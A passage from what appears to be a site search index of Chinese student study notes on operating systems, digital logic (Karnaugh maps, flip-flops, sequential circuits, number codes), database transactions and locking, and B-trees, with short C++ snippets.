哲学家就餐问题；\n  IPC 问题的解决方案？\n 信号量：一种抽象的数据结构，由一个整形变量和两个原子操作（P 减少、V 增加）构成； 管程：一个锁（控制管程代码互斥访问）和多个条件变量（管理共享数据的并发访问）构成；  条件变量是管程内的等待机制，每个条件条件变量表示一个等待原因，对应一个等待队列； 内部主要有两种函数操作 Wait() 与 Signal()；    进程调度算法 #  如何评价一个调度算法的优劣？\n CPU 使用率：CPU 处于忙状态的时间百分比； 吞吐量：单位时间内完成的进程数量； 等待时间：进程在就绪队列中，没有执行任务的总时间； 响应时间：从提交请求到产生响应所花费的总时间； 周转时间：进程从开始到结束（包括等待时间）的总时间；  进程调度有哪些算法？\n 先来先服务算法（First Come First Served, FCFS）； 短进程优先算法（SPN）、短剩余时间优先算法（SRT）； 高响应比优先算法（HRRN）； 时间片轮转算法（Round-Robin, RR）； 多级队列调度算法（MQ）； 多级反馈队列算法（MLFQ）； 优先级算法：静态优先级、动态优先级、线性优先级调度算法（SSR, Selfish Round Robin）  页面置换算法 #  什么是页面置换算法？\n 作用：当出现缺页异常，需调入新页面而内存已满时，置换算法选择被置换的物理页面； 目标：尽可能减少页面的调入调出次数；  页面置换算法有哪些？\n  最优页面置换算法（OPT）：一种想象出来的理想算法；\n  先进先出算法（First-In First-Out, FIFO）；\n  最近最久未使用算法（Least Rencently Used, LRU）；\n  最不常用算法（Least Frequently Used, LFU, NRU）；\n  时钟置换算法（Clock）；\n  "},{"id":164,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8D%A1%E8%AF%BA%E5%9B%BE/","title":"卡诺图","section":"数字逻辑","content":"卡诺图 #  n 个变量的卡诺图中最小项的合并规律如下：\n 卡诺图中小方格的个数必须为 $$2^m$$ 个（$$m \\in \\mathbb{Z}, m \\le n$$） 卡诺圈中的 $$2^m$$ 个小方格有一定的排列规律，他们含有 m 个不同变量，（n-m）个相同变量。 卡诺圈中的 $$2^m$$ 个小方格对应的最小项可以用 （n-m）个变量的与项表示，该与项由这些最小项中的相同部分组成。 当 m = 0 时，卡诺圈包含一个最小项；当 m = n 时，卡诺圈包围了整个卡诺图，可用 1 表示.  "},{"id":165,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8F%AF%E7%BC%96%E7%A8%8B%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/","title":"可编程逻辑器件","section":"数字逻辑","content":" 学习途径：\n 欧阳星明、华中科技大学出版社 《数字逻辑》   低密度可编程逻辑器件 #  可编程只读存储器 #  1. 半导体存储器分类 #  按功能分类可以分为随机存取存储器 RAM（Random Access Memory, RAM）和只读存储器 ROM（Read Only Memory）两大类。\n  RAM 是一种既可读又可写的存储器，故称为读写存储器。\n 优点是读写方便，使用灵活 缺点是一旦断点，所存储的信息便会丢失，它属于易失性存储器。    ROM 是一种在正常工作时只能读出、不能写入的存储器。\n  只读存储器存储属于的过程通常称为编程，根据编程方法的不同可以分为：掩膜编程 ROM（MROM）和用户可编程 ROM 两类。\n  只读存储器 ROM 属于非易失性存储器，即使切断电源，ROM 内的信息也不会丢失。\n    2. 可编程 ROM 的结构 #  可编程 ROM 主要由地址译码器和存储体两大部分组成：\n其中：\n $$A_0, A_1, \u0026hellip;, A_{n-1}$$ 称为地址输入线； $$W_0, W_1, \u0026hellip;, W_{2^n-1}$$ 称为地址译码输出线，一般称为字线； $$D_0, D_1, \u0026hellip;, D_{m-1}$$ 称为数据输出线，一般称为位线。  其实现方式，上半部分是一个与阵列构成的全地址译码器，下半部分是一个或阵列构成的网络：\n3. 可编程 ROM 的类型 #   一次编程的 ROM：PROM。产品出厂时，所有存储元均被加工为一个状态 ”0“（或 ”1“），用户可以根据需要将某些存储元的状态改变成另一状态，但这种编程只能进行一次。 可抹可编程 ROM：EPROM。可反复编程，但只能整体擦除，不能独立擦除。 电可抹可编程 ROM：EEPROM。使用灵活方便。 快闪存储器：Flash Memory。  可编程逻辑阵列 #  在 PROM 中，即使有多个存储单元所存放的内容完全相同也必须重复存放，无法节省这些单元；并且，PROM 的与阵列固定地产生 n 个输入变量的全部最小项。导致了芯片面积的利用率不高。\n为了解决这一问题，出现了一种与阵列和或阵列均可编程的逻辑器件，即 PLA (Programmable Logic Array)。其逻辑结构如下：\n"},{"id":166,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/","title":"同步时序逻辑电路","section":"数字逻辑","content":" 学习途径：\n 欧阳星明、华中科技大学出版社 《数字逻辑》   同步时序逻辑电路设计 #  设计的一般步骤：\n完全确定同步时序逻辑电路设计 #  1. 形成原始状态图和原始状态表 #  一般步骤：\n 确定电路模型：Mealy 模型、Moore 模型。 设立初始状态 根据需要记忆的信息增加新的状态 确定各时刻电路的输出  例子：\n 设计一个模 5 可逆计数器，该电路有一个输入 x 和一个输出 Z。x=0 表示加控制信号，x=1 表示减控制信号。输出 Z 表示借位或进位信号。尝试建立该计数器的 Mealy 型原始状态图和状态表。\n 假设计数器的 5 个状态分别为 0、1、2、3、4，其中 0 表示初始状态。原始状态表如下所示：\n   当前状态 次态/输出 Z 次态/输出 Z      x=0 x=1   0 1/0 4/1   1 2/0 0/0   2 3/0 1/0   3 4/0 2/0   4 0/1 3/0    2. 状态化简 #  等效状态：\n  定义：假设状态 $$S_i$$ 和 $$S_j$$ 是完全确定状态表中的两个状态，如果对所有可能的输入序列，分别从 $$S_i$$ 和 $$S_j$$ 出发，所得到的输出响应序列完全相同，则状态 $$S_i$$ 和状态 $$S_j$$ 是等效的，记作 $$(S_i, S_j)$$。\n  判断方法：输入相同；次态相同、次态交错或为各自的现态、次态循环或为等效对。\n  等效类：若干个彼此等效的状态构成的集合。\n最大等效类：不被任何别的等效类包含的等效类。\n利用隐含表进行状态化简：\n 作隐含表：一个边长为 n-1 的等腰直角三角形网格，纵向缺少第一个状态、横向缺少最后一个状态； 寻找等效对：按照隐含表从上至下、从左至右的顺序逐一检查。检查结果分三种情况：明确等效的、明确不等效的、与其他状态有关； 求出最大等效类：利用等效状态的传递性，求出各最大等效类； 作出最简状态表：将每个最大类中的全部状态合并成一个状态。  例子：\n 化简下图的原始状态表：\n     现态 次态/输出 次态/输出      x=0 x=1   A C/0 B/1   B F/0 A/1   C F/0 G/0   D D/1 E/0   E C/0 E/1   F C/0 G/0   G C/1 D/0     化简结果如下图：\n   现态 次态/输出 次态/输出      x=0 x=1   a b/0 a/1   b b/0 d/0   c c/1 a/0   d b/1 c/0    3. 状态编码 #  状态编码：\n 定义：指给最简状态表中用字母或数字表示的状态，指定一个二进制代码，形成二进制状态表。也称状态分配或状态赋值。 任务：确定二进制代码的位数；寻找一种最佳的或接近最佳的状态分配方案，以便使所设计的时序电路最简单  确定二进制代码位数：\n 若 m 为二进制代码位数，n 为状态总数：$$2^{m-1} \u0026lt; n \\le 2^m$$  相邻编码法：\n  基本思想：在选择状态编码时，尽可能有利于激励函数和输出函数的化简。\n  原则如下：\n  在相同输入条件下，具有相同次态的现态应该尽可能分配相邻的二进制代码；\n  在相邻输入条件下，在同一现态的次态应尽可能分配相邻的二进制代码；\n  输出完全相同的现态应尽可能分配相邻的二进制代码。\n    NOTICE：A、B 相邻：$$\\displaystyle \\sum_{bit=1} (A \\oplus B) = 1$$\n  例子：\n 给下面的状态表进行状态编码：\n     现态 次态/输出 次态/输出      x=0 x=1   A C/0 B/0   B A/0 A/1   C A/1 D/1   D D/0 C/0     二进制代码位数为 m，则 $$m = ceil[log_{2}4] = 2$$\n相邻编码法：\n 假定 A 是起始状态，则：code(A) = 00； 根据原则一，BC 应该具有相邻的二进制代码； 根据原则二，BC、AD、CD 应该具有相邻的二进制代码，code(D) = 10，code(C) = 11，code(B) = 01 分配完了不用看原则三了  所以二进制状态表如下图所示：\n   现态 现态 次态/输出 次态/输出     $$y_2$$ $$y_1$$ x=0 x=1   0 0 11/0 01/0   0 1 00/0 00/1   1 1 00/1 10/1   1 0 10/0 11/0    4. 确定激励函数和输出函数 #  我们知道四种种控触发器的激励表：\nR-S 触发器：\n   $$Q^n$$ $$Q^{n+1}$$ 功能 R S     0 0 置 0 或保持 d 0   0 1 置 1 0 1   1 0 置 0 1 0   1 1 置 1 或保持 0 d    D 触发器：\n   $$Q^n$$ $$Q^{n+1}$$ 功能 D     0 0 置 0 0   0 1 置 1 1   1 0 置 0 0   1 1 置 1 1    J-K 触发器：\n   $$Q^n$$ $$Q^{n+1}$$ 功能 J K     0 0 置 0 或保持 0 d   0 1 置 1 或计数 1 d   1 0 置 0 或计数 d 1   1 1 置 1 或保持 d 0    T 触发器：\n   $$Q^n$$ $$Q^{n+1}$$ 功能 T     0 0 保持 0   0 1 计数 1   1 0 计数 1   1 1 保持 0    根据二进制状态表和触发器的激励表，求激励函数和输出函数的最简表达式一般分为两步：\n  首先列出激励函数和输出函数真值表；\n  然后画出激励函数和输出函数卡诺图，化简后写出最简表达式。\n  PostScript: 除此之外，还可以根据二进制状态表和触发器的次态方程确定，见书本 P142\n例子：\n 用 J-K 触发器和适当的门电路实现下表所示的而今hi状态表的功能\n     现态 现态 次态/输出 次态/输出     $$y_2$$ $$y_1$$ x=0 x=1   0 0 11/0 01/0   0 1 00/0 00/1   1 1 00/1 10/1   1 0 01/0 11/0     作出激励函数和输出状态真值表：\n   x $$y_2$$ $$y_1$$ $$J_2$$ $$K_2$$ $$J_1$$ $$K_1$$ Z     0 0 0 1 d 1 d 0   0 0 1 0 d d 1 0   0 1 0 d 1 1 d 0   0 1 1 d 1 d 1 1   1 0 0 0 d 1 d 0   1 0 1 0 d d 1 1   1 1 0 d 0 1 d 0   1 1 1 d 0 d 1 1    对 $$J_2, K_2, J_1, K_1, Z$$ 做出卡诺图，并且化简，可以得到下面的式子：$$\\displaystyle \\begin{cases} J_2 = \\overline{x} \\cdot \\overline{y_1} \\ K_2 = \\overline{x} \\ J_1 = K_1 = 1 \\ Z = (y_2 + x) \\cdot y_1 \\end{cases}$$\n然后就可以画出电路图了。\n不完全确定同步时序逻辑电路设计 #  （不想看了）\n"},{"id":167,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/","title":"异步时序逻辑电路","section":"数字逻辑","content":" 学习途径：\n 欧阳星明、华中科技大学出版社 《数字逻辑》   异步时序逻辑电路 #  脉冲异步时序逻辑电路分析 #  分析步骤如下：\n 写出电路的输出函数和激励函数表达式 列出电路的次态真值表或次态方程组 作出状态表和状态图 画出时间图并用文字描述电路的逻辑功能  例子：\n 分析下图所示的脉冲异步时序逻辑电路，指出该电路的主要功能：\n STEP 1：写出输出函数和激励函数表达式：\n 输出函数：$$Z = x \\cdot y_2 \\cdot y_1$$ JK1 激励函数：$$J_1=K_1=1, C_1 = x$$ JK2 激励函数：$$J_2=K_2=1, C_2 = y_1$$  STEP 2：列出电路的次态真值表或次态方程组：\n由 STEP 1 中的分析可知，两个 JK 触发器均工作在计数状态，即恒有：$$Q^{n+1} = \\overline{Q^n}$$。所以次态真值表（x=1）：\n   现态 现态 次态 次态     $$y_2$$ $$y_1$$ $$y_2^{n+1}$$ $$y_1^{n+1}$$   0 0 0 1   0 1 1 0   1 0 1 1   1 1 0 0    STEP 3：做出状态表和状态图：\n（状态表略）状态图：\nSTEP 4：画出时间图并用文字描述电路的逻辑功能：\n（时间图略）\n由上知，该电路是一个模 4 加 1 计数器，当收到第四个输入脉冲时，电路产生一个进位输出脉冲。\n脉冲异步时序逻辑电路设计 #  脉冲异步时序逻辑电路设计的一般过程与同步时序逻辑电路设计大体相同。\n在脉冲异步时序逻辑电路设计时，主要注意以下两点：\n 若有多个输入信号，在形成原始状态图和状态表时，只需要考虑多个输入信号中的一个为 1 的情况，从而使问题简化。 由于电路中没有统一的时钟脉冲，钟控触发器的时钟信号同样需要求激励函数。  电平异步时序逻辑电路分析 #  电平异步时序逻辑电路的分析过程比较简单，其一般步骤如下：\n 根据逻辑电路图写出输出函数和激励函数表达式； 作出流程图； 作出总态图或时间图； 说明电路逻辑功能。  例子：\n 分析下图所示电平异步时序逻辑电路：\n STEP 1：写出输出函数和激励函数表达式：\n 输出函数：$$Z = y_1 \\cdot y_2$$ $$Y_2$$ 激励函数：$$Y_2 = x_1 x_2 y_2 + \\overline{x_1} x_2 \\overline{y_1}$$ $$Y_1​$$ 激励函数：$$Y_1 = x_2 y_1 + x_1​$$  STEP 2：作出流程表：\n因为输出函数与输入无关，所以这是一个 Moore 型电路：\n   $$y_2$$ $$y_1$$ $$x_2x_1 = 00$$\n$$Y_2Y_1​$$ $$x_2x_1 = 01$$\n$$Y_2Y_1​$$ $$x_2x_1 = 11$$\n$$Y_2Y_1​$$ $$x_2x_1 = 10$$\n$$Y_2Y_1​$$ Z     0 0 $$\\enclose{circle}{00}$$ 01 01 10 0   0 1 00 $$\\enclose{circle}{01}$$ $$\\enclose{circle}{01}$$ $$\\enclose{circle}{01}$$ 0   1 1 00 01 $$\\enclose{circle}{11}$$ 01 1   1 0 00 01 11 $$\\enclose{circle}{10}$$ 0    STEP 3：作出总态图：\n（懒得画了）\nSTEP 4：说明功能：\n该电路是一个 ”00 10 11“ 序列检测器。\n电平异步时序逻辑电路设计 #  （懒得看了）\n"},{"id":168,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E6%95%B0%E5%88%B6%E4%B8%8E%E7%BC%96%E7%A0%81/","title":"数制与编码","section":"数字逻辑","content":" 学习途径：\n 欧阳星明、华中科技大学出版社 《数字逻辑》   数制与编码 #  数制与转换 #  广义的说，一种进位数制包含着基数和位权两个基本要素：\n  基数：是指计数制中所用到的数字符号的个数。基数为 R 的计数制称为 R 进位计数制，简称 R 进制。\n  位权：在一种进位计数制表示的数中，用来表示不同数位上数值大小的一个固定常数。\n  一般来说，一个 R 进制数 N 可以有以下两种表示方法：\n 并列表示法，又称为位置计数法，其表达式为：$$(N)R = (K{n-1}K_{n-2}\u0026hellip;K_1K_0 . K_{-1}\u0026hellip;K_{-m})_R$$ 多项式表示法，又称按权展开法，其表达式为：$$\\displaystyle (N)R = \\sum{i=-m}^{n-1} K_iR^i$$  带符号二进制数的表示 #  原码 #  二进制小数 $$X = \\pm 0.x_{-1}x_{-2}\u0026hellip;x_{-m}​$$，原码定义为：$$\\displaystyle [X]_{原} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 1 \\ 1 - X \u0026amp;, -1 \u0026lt; X \\le 0\\end{cases}​$$\n二进制整数 $$X = \\pm x_{n-1}x_{n-2}\u0026hellip;x_0​$$，原码定义为：$$\\displaystyle [X]_{原} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 2^n \\ 2^n - X \u0026amp;, -2^n \u0026lt; X \\le 0\\end{cases}​$$\n反码 #  二进制小数 $$X = \\pm 0.x_{-1}x_{-2}\u0026hellip;x_{-m}$$，反码定义为：$$\\displaystyle [X]_{反} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 1 \\ (2 - 2^{-m}) + X \u0026amp;, -1 \u0026lt; X \\le 0\\end{cases}$$\n二进制整数 $$X = \\pm x_{n-1}x_{n-2}\u0026hellip;x_0$$，原码定义为：$$\\displaystyle [X]_{反} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 2^n \\ 2^{n+1} - 1 + X \u0026amp;, -2^n \u0026lt; X \\le 0\\end{cases}$$\n补码 #  二进制小数 $$X = \\pm 0.x_{-1}x_{-2}\u0026hellip;x_{-m}$$，补码定义为：$$\\displaystyle [X]_{补} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 1 \\ 2 + X \u0026amp;, -1 \\le X \u0026lt; 0\\end{cases}$$\n二进制整数 $$X = \\pm x_{n-1}x_{n-2}\u0026hellip;x_0$$，原码定义为：$$\\displaystyle [X]_{补} = \\begin{cases} X \u0026amp;, 0 \\le X \u0026lt; 2^n \\ 2^{n+1} + X \u0026amp;, -2^n \\le X \u0026lt; 0\\end{cases}$$\n几种常用的编码 #  十进制数的二进制编码 #  BCD 码：二-十进制代码（Binary Coded Decimal）使用 4 位二进制代码对十进制数字符号进行编码。\n常用的三种 BCD 码，表示表格如下：\n   十进制符号 8421 码 2421 码 余三码     0 0000 0000 0011   1 0001 0001 0100   2 0010 0010 0101   3 0011 0011 0110   4 0100 0100 0111   5 0101 1011 1000   6 0110 1100 1001   7 0111 1101 1010   8 1000 1110 1011   9 1001 1111 1100     对于 2421 码：$$X = 2a_3 + 4a_2 + 2a_1 + a_0$$。其不具有单值性，因此不允许出现 $$0101 \\sim 1010$$ 之间的数字。  可靠性编码 #  格雷码（Gray Code）：任意两个相邻的数，其格雷码仅有一位不同。\n格雷码可以从普通二进制数计算得到：\n 设二进制数 $$B = B_{n-1}B_{n-2}\u0026hellip;B_0$$，其格雷码为 $$G = G_{n-1}G_{n-2}\u0026hellip;G_0$$ 用以下的关系可以由 B 推导 G：$$\\displaystyle \\begin{cases} G_{n-1} = B_{n-1} \\ G_i = B_{i+1} \\oplus B_i, 0 \\le i \\le n-2\\end{cases}$$  典型格雷码对应表如下：\n   十进制数 4 位二进制码 典型格雷码     0 0000 0000   1 0001 0001   2 0010 0011   3 0011 0010   4 0100 0110   5 0101 0111   6 0110 0101   7 0111 0100   8 1000 1100   9 1001 1101   10 1010 1111   11 1011 1110   12 1100 1010   13 1101 1011   14 1110 1001   15 1111 1000    #  奇偶校验码（Parity Check Code）：一种能检测出错误的代码。\n奇检验码使总体的 1 比特位数为奇数，即：$$Code_{奇检验}(n) = \\begin{cases} 1, Bit1Amout(n) \\in {偶数} \\ 0, Bit1Amout(n) \\in {奇数}\\end{cases}$$，偶检验码同理\n下表为 8421 码对应的就检验码：\n   十进制数码 8421 码信息位 奇检验检验位 偶检验检验位     0 0000 1 0   1 0001 0 1   2 0010 0 1   3 0011 1 0   4 0100 0 1   5 0101 1 0   6 0110 1 0   7 0111 0 1   8 1000 0 1   9 1001 1 0    "},{"id":169,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E8%A7%A6%E5%8F%91%E5%99%A8/","title":"触发器","section":"数字逻辑","content":" 学习地址：http://210.45.192.19/kecheng/2004/11/courseware/chapter4.ppt\n 触发器 #  分类 #  按动作特点分类：基本 RS 触发器、同步 RS 触发器、主从触发器、边沿触发器\n按功能分类：RS 触发器、JK 触发器、D 触发器、T 触发器\n1. 基本 RS 触发器 #  1.1 电路结构 #  1.2 动作特点 #  功能表：\n   R S Qn+1 功 能     0 0 ╳ 不 定   0 1 0 置 “0”   1 0 1 置 “1”   1 1 Qn 保 持    $$Q_{n+1}$$ 卡诺图：\n逻辑公式：\n$$Q^{n+1} = RQ^{n} + \\overline{S}\\ where\\ R + S = 1$$\n1.3 逻辑符号 #  2. 同步 RS 触发器 #  2.1 电路结构 #  2.2 动作特点 #  功能表：\n   S R $$S′=\\overline{S}$$ $$R′=\\overline{R}$$ $$Q_{n+1}$$ 功 能     0 0 1 1 $$Q_{n}$$ 保 持   0 1 1 0 0 置 “0”   1 0 0 1 1 置 “1”   1 1 0 0 x 不 定    卡诺图：\n逻辑公式：\n$$Q_{n+1} = \\overline{R}Q^{n} + S\\ where\\ RS = 0$$\n2.3 逻辑符号 #  2.4 波形图 #  3. 主从 RS 触发器 #  主从RS触发器状态的翻转发生在 CP 脉冲的下降沿，即 CP 由 1 跳变到 0 的时刻。\n  当 CP=1 时，CP‘=0，主触发器动作，从触发器被封锁；\n  当 CP=0 时，CP’=1，主触发器被封锁，从触发器动作。\n  3.1 电路结构 #  3.2 动作特点 #  主从 RS 触发器的逻辑功能与同步 RS 触发器的逻辑功能相同，因此特性表、特性方程、状态图和驱动表也完全相同。\n4. 主从 JK 触发器 #  4.1 电路结构 #  4.2 动作特点 #  功能表：\n   J K Qn+1 功 能     0 0 Qn 保 持   0 1 0 置 “0”   1 0 1 置 “1”   1 1 $$\\overline{Q_{n}}$$ 计 数    逻辑公式：\n  同步 RS 触发器：$$Q_{n+1} = \\overline{R}Q^{n} + S\\ where\\ RS = 0$$\n  又由图片信息：$$R = KQ_{n}, S = J\\overline{Q_{n}}$$\n  所以逻辑公式：\n$$Q^{n+1} = \\overline{K}Q_{n} + J\\overline{Q_{n}}$$\n4.3 逻辑符号 #  4.4 波形图 #  5. D 边沿触发器 #  5.1 电路结构 #  5.2 动作特点 #  功能表：\n   D $$Q_{n+1}$$ 功能     0 0 置 “0”   1 1 置 \u0026ldquo;1\u0026rdquo;    逻辑公式：$$Q_{n+1} = D$$\n5.3 逻辑符号 #   RD 直接置0端 SD 直接置1端  5.4 波形图 #  6. T 触发器 #  6.1 电路结构 #  （没有）\n6.2 动作特点 #  功能表：\n   T $$Q^{n+1}$$ 功能     0 $$Q^n$$ 保持   1 $$\\overline{Q^n}$$ 计数    特性方程：\n$$Q^{n+1} = T \\overline{Q^n} + \\overline{T}Q^n$$\n"},{"id":170,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/","title":"面试复习","section":"数据库系统原理","content":" 参考：\n  https://www.zhihu.com/question/31346392\n  https://github.com/CyC2018/CS-Notes/blob/master/notes/数据库系统原理.md\n  https://www.jianshu.com/p/f692d4f8a53e\n   数据库系统原理 #  事务 #  为什么会出现事务（Transaction）？\n 为了当应用程序访问数据库的时候，事务能够简化我们的编程模型。 应用层不需要去考虑各种各样的潜在错误（网络错误、服务器宕机等）和并发问题；  什么是事务？\n 满足 ACID 四个特性的一组操作； 可以通过 commit 操作结束一个事务，也可以通过 RollBack 操作回滚到事务的开始；  ACID：\n 原子性（Atomicity）：事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚（可以通过 undo log 实现）。 一致性（Consistency）：事务执行前后的状态都是正确的，事务操作应当将数据库从一个正确状态转移到另一个正确状态； 隔离性（Isolation）：降低并发事务之间的影响程度； 持久性（Durability）：一旦事务提交，则其所做的修改将会永远保存到数据库中；若系统发生崩溃，可以通过 redo log 重做；  并发问题 #  并发导致的一致性问题：\n  丢失修改：并发进行的事务对同一个数据进行修改，后者覆盖了前者的内容；\n  脏读：事务 A 修改了一个数据，但未提交；事务 B 读到了事务 A 未提交的更新结果，如果事务 A 提交失败进行了回滚，事务 B 读到的就是脏数据。\n  不可重复读：在同一个事务中，对于同一份数据读取到的结果不一致。比如，事务 B 在事务 A 提交前读到的结果，和提交后读到的结果可能不同。\n避免这种情况：加锁或 MVCC；\n  幻读：在同一个事务中，同一个查询多次返回的结果不一致。\n因为对于新增的记录根本无法加锁。需要将事务串行化，才能避免幻读。\n  多版本并发控制（Multi Version Concurrency Control, MVCC）：\n 实现方式：通过在每行记录后面保存两个隐藏的列：一个保存了行的创建时间，一个保存行的过期时间（或删除时间）。当然存储的并不是实际的时间值，而是系统版本号（system version number)。每开始一个新的事务，系统版本号都会自动递增。  在 REPEATABLE READ 隔离级别下，MVCC 的“增删改查”四种操作：\n INSERT：InnoDB 为新插入的每一行保存当前系统版本号作为行创建标识。 DELETE：InnoDB 为删除的每一行保存当前系统版本号作为行删除标识。 UPDATE：InnoDB 会插入一行新的记录，保存当前系统版本号作为创建标识，同时保存当前系统版本号到原来的行作为行删除标识。 SELECT：InnoDB 会根据以下两个条件检查每行记录，InnoDB 只查找：  创建标识早于当前事务版本的数据行，这样可以确保事务读取的行，要么是在事务开始前已经存在的，要么是事务自身插入或者修改过的。 行的删除标志要么未定义，要么大于当前事务版本号。这可以确保事务读取到的行，在事务开始之前未被删除。    封锁 #  在 MySQL 中，提供了两种封锁粒度：行级锁以及表级锁。如何选用锁？\n 应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。 加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。  锁的类型（读写锁）：\n  互斥锁（Exlusive），X 锁，或写锁。\n事务 T 对数据 D 加了 X 锁，T 就可以对 D 进行读写，其他事务不对能 D 加锁；\n  共享锁（Shared），S 锁，或读锁。\n事务 T 对数据 D 加了 S 锁，T 只可以对 D 进行读，加锁期间其他事务可以对 D 加 S 锁、不能加 X 锁；\n  意向锁（Intention Locks）：\n 背景：在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。 意向锁在原来的 X/S 锁之上引入了 IX/IS 表锁，它们使用有以下规定：  一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁； 一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。 任意 IS/IX 锁之间都是兼容的，因为它们只表示想要对表加锁，而不是真正加锁；    封锁协议：\n 一级封锁协议：事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁； 二级封锁协议：在一级的基础上，要求读取数据 A 时必须加 S 锁，读取完马上释放 S 锁； 三级封锁协议：在一级的基础上，要求读取数据 A 时必须加 S 锁，直到事务结束了才能释放 S 锁；  隔离级别 #  数据库隔离性表现的四个等级，由低到高分别是：\n 未提交读（READ UNCOMMITTED）：事务中的修改即使没有提交，对其他事务也是可见的； 提交读（READ COMMITTED）：一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。 可重复读（REPEATABLE READ）：保证在同一个事务中多次读取同一数据的结果是一样的； 可串行化（SERIALIZABLE）：强制事务串行执行，这样多个事务互不干扰，不会出现并发一致性问题。  "},{"id":171,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/b-tree/","title":"B Tree","section":"数据结构","content":" 学习链接：\n https://www.geeksforgeeks.org/b-tree-set-1-introduction-2/ https://www.geeksforgeeks.org/b-tree-set-1-insert-2/   B-Tree #  Introduction #  Defination:\n B-Tree is a self-balancing search tree. In most of the other self-balancing search trees (like AVL and Red-Black Trees), it is assumed that everything is in main memory.\n Usage:\n Disk access time is very high compared to main memory access time. The main idea of using B-Trees is to reduce the number of disk accesses.\n Analysis:\n Most of the tree operations (search, insert, delete, max, min, ..etc ) require O(h) disk accesses where h is the height of the tree.\nGenerally, a B-Tree node size is kept equal to the disk block size.\n Properties:\n All leaves are at same level. A B-Tree is defined by the term minimum degree ‘t’. The value of t depends upon disk block size. Every node except root must contain at least t-1 keys. Root may contain minimum 1 key. All nodes (including root) may contain at most 2t – 1 keys. Number of children of a node is equal to the number of keys in it plus 1. All keys of a node are sorted in increasing order. The child between two keys k1 and k2 contains all keys in the range from k1 and k2. B-Tree grows and shrinks from the root which is unlike Binary Search Tree. Binary Search Trees grow downward and also shrink from downward. Like other balanced Binary Search Trees, time complexity to search, insert and delete is O(Logn).  Method #  Traverse #  template\u0026lt;class T\u0026gt; list\u0026lt;T\u0026gt; BTree\u0026lt;T\u0026gt;::traverse()const{ // terminated condition: this is a leaf node  if(this-\u0026gt;is_leaf_node()) return this-\u0026gt;data; auto i = this-\u0026gt;data.begin(); auto j = this-\u0026gt;children.begin(); // traverse the first child tree  list\u0026lt;T\u0026gt; res = (*j)-\u0026gt;traverse(); // begin with the first data node =\u0026gt;  // traverse the node and its next node tree in order  for(++j; i != this-\u0026gt;data.end(); ++j, ++i){ res.push_back(*i); auto tr = (*j)-\u0026gt;traverse(); res.insert(res.end(), tr.begin(), tr.end()); } return res; } Search #  template\u0026lt;class T\u0026gt; BTree\u0026lt;T\u0026gt;* BTree\u0026lt;T\u0026gt;::search(const T\u0026amp; val)const{ auto i = this-\u0026gt;data.begin(); auto j = this-\u0026gt;children.begin(); for(;i != this-\u0026gt;data.end(); ++i) if(*i \u0026lt; val) ++j; else break; if(*i == val) return this; if(this-\u0026gt;is_leaf_node()) return NULL; return (*j)-\u0026gt;search(val); } Insert #  Unlike BSTs, we have a predefined range on number of keys that a node can contain. So before inserting a key to node, we make sure that the node has extra space.\nSo Here is a question: How to make sure that a node has space available for key before the key is inserted?\n We use an operation called splitChild() that is used to split a child of a node.  As discussed above, to insert a new key:\n Initialize x as root. While x is not leaf, do following  Find the child of x that is going to to be traversed next. Let the child be y. If y is not full, change x to point to y. If y is full, split it and change x to point to one of the two parts of y. If k is smaller than mid key in y, then set x as first part of y. Else second part of y. When we split y, we move a key from y to its parent x.   The loop in step 2 stops when x is leaf. x must have space for 1 extra key as we have been splitting all nodes in advance. So simply insert k to x.  "},{"id":172,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/bintree/","title":"Bin Tree","section":"数据结构","content":"Chapter 10\u0026ndash;Binary Trees #  Binary Trees #  Definitions #  Binary Tree:\n A binary tree is either empty, or it consists of a node called the root together with two binary trees called the left subtree and the right subtree of the root.\n  Empty Tree: The first case, the base 